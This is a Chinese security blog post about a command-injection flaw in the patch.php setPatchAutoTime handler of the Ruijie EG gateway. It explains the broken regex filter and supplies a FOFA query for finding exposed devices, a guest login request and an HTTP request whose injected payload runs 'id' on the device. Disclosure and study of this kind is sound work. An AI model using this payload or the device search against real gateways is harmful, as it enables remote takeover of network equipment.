---
title: "锐捷-EWEB patch.php 命令注入漏洞"
source: https://mrxn.net/jswz/ruijieweb-patch-setPatchAutoTime-rce.html
asset_dir: assets/锐捷-eweb-patch.php-命令注入漏洞
---

# 锐捷-EWEB patch.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/29 08:50
- 1465浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

脚本语言

补丁

脚本

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `patch.php` 的 `setPatchAutoTime`存在[命令注入](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)在设备上执行任意命令，造成设备失陷等高危风险。

软件

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `patch.php` 关键业务 `setPatchAutoTimeAction` 逻辑的实现

```
public function setPatchAutoTimeAction(){
    $pram = p("pram");
    $strcmd = json_encode($pram);
    $cmd = "lua /sbin/patch-upgrade/config_patch_upgrade_mode.lua "."'".$strcmd."'";
    $json = self::execShell($cmd,false);
    ajax_echo($json);
}
```

接收 `pram` 参数的值经过 `json_encode` 处理后，直接拼接进 `$cmd` 命令中，然后调用 `execShell` 执行，看下 `execShell` 功能实现

代码安全审计

深入探索

网络安全课程

编码转换工具

恶意软件分析工具

```
protected  function execShell($cmd,$escapeCmd = true,$isUtf8){
     $timing = microtime(true);
     if($escapeCmd){
        $cmd = EscapeShellCmd($cmd);
     }else{
        $reg='/(\;|\&|\|)+/';
        if (count(preg_split($reg,$cmd)) > 1) {
            $forbidstr = "forbid Special characters!";
            return $forbidstr;
        }
     }
     $str = shell_exec($cmd);
     if ($this->debug) {
         $timing = (int) ((microtime(true) - $timing) * 1000);
         error_log("SHELL:".$cmd."\ntime:".$timing."ms",0);
     }
     if(!$isUtf8){
        $str = iconv('GB2312','UTF-8//IGNORE',$str);
     }
     return $str;
}
```

根据 `$escapeCmd` 的布尔值来决定是否使用 `EscapeShellCmd` 来进行过滤，默认是用它过滤的，但是 `setPatchAutoTimeAction` 指定 `$escapeCmd` 为 `false` ，因此预期使用正则来判断是存在 分号、链接符、竖线 这些命令注入常用字符，但是这个正则在 PHP 里写法是**错误**的，导致失去判断的作用！因此造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB patch.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 命令注入

> 我们只需要闭合前后的单引号就可以执行命令
>
> 漏洞修复方案
>
> 或者使用 反引号**`**

```
POST /patch.php?a=setPatchAutoTime HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

pram=%20'%3bid%20%23
```

[![锐捷-EWEB patch.php 命令注入漏洞](images/img-002-7d02b6a00582.webp)](https://image.mrxn.net/f8f26ba0dfbb42898d2f89377cfee74b.webp)

成功执行 `id` 命令并回显结果。

代码安全审计

反引号命令执行

[![锐捷-EWEB patch.php 命令注入漏洞](images/img-003-21a979a8079b.webp)](https://image.mrxn.net/b22d2cc9877a4decb7a8693527d7bc4a.webp)

PS: 正确正则写法 `$reg = '/(;|&|\|)+/';`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.命令注入](#toc-5-2-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALeklEQVR4Aeyc7XLjxg5EdfL+75xrqPdQHHBGlNc3ln7QtUizPwDSBLWWvFX553a7/fs39e+fr977Rz6daa5jn9e5eXX5DM2s0J6V33XzHc2py/8GayFffdefT7kD20K+tnt7pfqF26MO3IDDLH0Rkuu8z9NXh/TJ9We4ynS9c2epi+qQa4Cgekf7znDfty1kL17H77sDh4VAtg4jvnqJPg0w9qv3OZBc1+VnfZB+OKIzOkKy6jByzwmjbl5ffoaQOTDirO+wkFno0n7vDvx4IZCt+9TAyM++FfvMwdgP4RA09wz7THlHGGfqO7tz9Y6v5nrfjP94IbOhl/b3d+DHC/HpgPFpg/Duy8XVpUP69c/y5gph7C1tXzD3IToE9z11DKP+nWuq/lfqxwt55SRX5vU7cFiIW+94NtL8Pff1HzmMT9WX9dIf+w3DOEd/hr0H0gvB3mNeXQ7Jy/Vh1PVXaF/HWf6wkFno0n7vDmwLgWwdnmO/NEi+6537dMCYh3D93idf+ZB+wOiGvUcO3H+bsAUXB6/mYT4PosNz3J9+W8hevI7fdwf+8Sn4LnrJ9kGeAvWOEL/n5at81zu3v7B7K17Zqu5DrlEdwitbpV7HVfDcr8x363qFeJc/BA8LgWzd64NwGLH7/UmA5NV7Xr5C+0TIPPMQDkfsmT4D0mNOX75CSB8Eew7mujmY+xAduB0Wcru+3noHDgs5e1q6L4fHloHtmwJeekcDyTnPATDq+qK5QrWO5VWp13EVZHYdV+mLpVVBcuodK1OlXsf7gvTvtTqGo35YSAWvet8dWC4Ejtury4RRh/D+dMhXWLP2ZW6v7Y+B4ZUGOe8sA/EgaAbC+7kgurmO5mHMwch7X+fO6fqeLxeyD13Hv3cHDguBbL1vUy6uLrH7kHnmYc5hrjtPhDHn3EIzYmmzgswwJ5qF0Vc3B3PfHMSHoPoKnVt4WMiq6dJ/5w78A9kiBGtLVavTQ3L6la2Sw+h3vbJV6mJpVZD+Oq7SF0urku8R0gvBvVfH1VdVx8+qMlVmIPMgqL7C6t3XWQ4yF7g+h9w+7Gv7XZbXBdmWXITobh7C9TvC6NtnrnNIXh3CzYsw6uYLzXSE9EBQH8Ih2HV5zZ4VjH3mRRh9GLm5PV4/Q/Z34wOODwvxSYBxm12X+z1A8upi9yE5COp3XPWri5A5wDZCr6MB9RVXF4HhM5B6n6MurnzIPAiaLzwspMSr3ncHtndZXgJka327MOoQDkH7RZjr+s7vCGMfhJuzX1QvVIP0wIiVqYLo9/zXfyAcgpWpgvCvyP0PzDm8pt+HfP2nZq/qeoV83aBP+nN4l+XmYNy6Fw3RzXWE+OY7mofkYET93gfJrXRgs/qMzg2udGD6M8M+iL/qX+m9HzIHHni9QrxLH4Lbz5DVVrve+er7MCee5boPeWp6P0SHoP4enaUmh7FHvWPvO+O9H147T+8rfr1C6i58UG0LgWwVgv0afUogPoxo3pwckpOfIczzzhXP5pQP81kQHYJ9JkSvGVXwnPf+6qmC9OmL5a1qW8gqcOm/ewe2d1luryNky15W99VhzKmbl8OYg5H3/KpPfYaQmc6CkauLsxkzbZWHzIegORGiO1NdvsfrFbK/Gx9wfFgIzLcJ0SHotT/bdmVgzJe2r7N+s6scZD480B6I1nshOgTN91znkHzX5SJw/xwDyTsfRq5uX+FhIYYufM8d2D6HQLZXW6qCcAiWti+I7mXrwajrv4rwvB9G3/POsJ8Txt7uy50Fycv1z7Dn5WLvh5wHuP7F8PZhX4e/siDb6tuE6BD0+4BwCKqLzumoD+k78813hPTDEZ3Ze9RFSO8qp25eLkL6YcRXfXOFh4WUeNX77sDyc0i/JJ+Ojj3XOeSp6foZ9zyrnP4Mz3og1wRBZ0A4BJ0D4TBHc87p+KpfuesVUnfhg+rwLgvyFKyuEeZ+fyogOXXnQXT5yocxByO3H6IDSksE7p8PloFmwJj3WsUW3yiMfRow6hDuvMLrFeLd+hC8FvIhi/AytoXUy6VKo3BWlanqHuTl1/XOq3df3f8u/3/Mglz7flYd92uB5LreefVWvarvc9tC9uJ1/L47cFhIbbYKxqcBwmFEL716quQiJC8XYa7XjH2ZV5ND+uGIPSN3hth1ufhqzjwcrwXQvr+hgAffjN3BYSE77zp8wx3YPhiendunpaN9wP0JkIvmIT4E9eE5N9fRuV0vridCzgEj6ldPFcSv41eq96+4uthnQ84LXL9cvH3Y1+kHQ7cKjy3C47h/PxDPvu7Luw9jHzznfU7NU/suQs7V++A1vc5dZX8dV0H6IajfsbLW9TOk35038+1niBvq6PV1vfOek8P4dNgH0eXmO8I8B9HhgfbCQ4PH/9RZv59TLvbcSoecxzyEQ1DdfniuA9fPkNuHfW1/ZUG2ByN6vTDX9UUYcz4dDz++OozcnGhOLq708lfeSodcQ/XuC+a6GefB8xyMPoRD0HmF20KKXPX+O7C9y+qX4vbV5SJkuxBU73mY++ZESA6CKx1G3/MW2tMRxh4YefVW2QfxS6tSP8PKVvVcaa/W9Qrpd+/NfHuX1a8D8pSoQzgE3Xj3u965+Y6rXNflkOuAB+r12WccHjOAQxwYfgsBI7cBonsdYvdXvPTrFVJ34YNqW0jf5op33e9FHfKUQFB/hfbpd64uQubOchDPrGgWnvvmxN7fOWSeedEcxJd37Pnyt4UUuer9d2C5EJhvF0a9b7lzv0VI35lvXoSxb9Vvfo8927lZyDnkHWHu93mQHASdAyPvOsQHrk/qtw/72l4hkC2trg/i96fCPMSXixB91WdOH5Jf6TD65mYI82w/V+fOgvTrd73znpN3tE/c+9tCNC987x04LGS/rTrulwd5aiC48rsuh7EPRl7n3Jd9anIY+9QLIV7vKa8K4tfxrOC533v6eTrv+c4h5wOunyG3D/vafpflViHb6tepL+rD9/K9z3kwzoHn3L49OltN3rH7MJ5r5UNy3Xc+xJevENa5w19ZqyGX/jt3YPtdFmRrZ9uH5Ly8nu8ckoegvvjqnJ6HzIMHOqsjJNN1+Wp2983B83kw+jBy5zh/j9crZH83PuD4sBDINiHoNbpVUR2SU4dwffHMh/TBHPsc56nvEcYZPQvx7YHwnuvc/Bn2vs5hPJ9+4WEhZye7/P/2DmzvsvppaltVXYdsV70yVTDq+iLEr2yVulhaVeelValD5kBQ/RWEsafmVvXe0qogeQiaK69KDqMP4TCi+Wd4vUKe3Z03eNu7rNr4vlbXss/UMeQpWOW/q9fMKvsg8yGoXplV9Qykt+d7Tg5jXl2E+HKxz5fri+qQOfDA6xXiXfoQ3H6GwGNLcH7s9bttUb3jmQ85p30w8lU/JAfYuiFw/7dweyHcAIRDUF2E6ParixBfLsJcf8W/XiHepQ/BbSE+BWfYrxvyNEDQfgg3D+EQ7Lp96qI6jH3dr5yaWFqVXITMKq9KfYWQ/Mrves2s6rq8vCr5HreF7MXr+H134LAQyNMAI756iZA+8/UkzEq/I4z9MHLzEB2OaGaFXg+kt+f0uw7J64vmID6M2H256JzCw0IMXfieO/DjhdRW9+W3oSYX4fnT0/vkonNE9UI1EcZzVaYKotfxviC6/Xorfqbri87rHHJe4PoXw9uHff34FQKP7QLbtwfcPwNAcDP+HPi0dPxjHwDGOfbtg2ri3qtjGGdAOARXfdX7rOB7/ZD8bOaPFzIbeml/fwcOC/Ep6bg6hTn9ztU7Qp4SGLHnVhzSt/dh1LwWcZ+dHUP6ITjLlAaj3+fLO0L61GHkpR8WUie86n13YFsIZFvwHF+91Np2lXnIXHnHylbBPFfevnp/cf06roLMgqC+WJl9qYuQPjMQrt91iL/Se98sty1E88L33oFrIe+9/4ez/w8AAP//qnDuYAAAAAZJREFUAwCgum68CmmwIwAAAABJRU5ErkJggg==)

手机扫码阅读
